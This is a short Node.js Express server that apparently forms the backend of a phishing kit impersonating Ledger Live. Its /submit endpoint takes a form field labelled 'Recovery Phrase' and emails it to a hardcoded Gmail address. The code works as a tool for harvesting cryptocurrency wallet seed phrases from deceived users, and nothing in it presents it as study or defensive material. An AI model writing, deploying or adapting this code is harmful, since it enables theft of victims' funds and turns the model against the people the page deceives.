const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors({
  origin: ['http://localhost:3000', 'http://172.20.10.3:3000'],
  credentials: true
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));


const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});
// Submit endpoint
app.post('/submit', async (req, res) => {
  try {
    const { form_type, fullname } = req.body;

    console.log('Received form submission:', { form_type, fullname });

    // Send email
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: 'tykeshare@gmail.com',
      subject: 'Ledger Live Form Submission',
      html: `
        <h2>New Form Submission</h2>
        <p><strong>Form Type:</strong> ${form_type}</p>
        <p><strong>Recovery Phrase:</strong></p>
        <p>${fullname}</p>
        <hr>
        <p><em>Submitted at: ${new Date().toLocaleString()}</em></p>
      `
    };

    await transporter.sendMail(mailOptions);

    console.log('Email sent successfully');
    res.json({ success: true, message: 'Form submitted and email sent successfully' });

  } catch (error) {
    console.error('Error processing submission:', error);
    res.status(500).json({ success: false, error: 'Failed to process submission' });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'Server is running', timestamp: new Date().toISOString() });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Make sure to set EMAIL_USER and EMAIL_PASS in your .env file`);
});
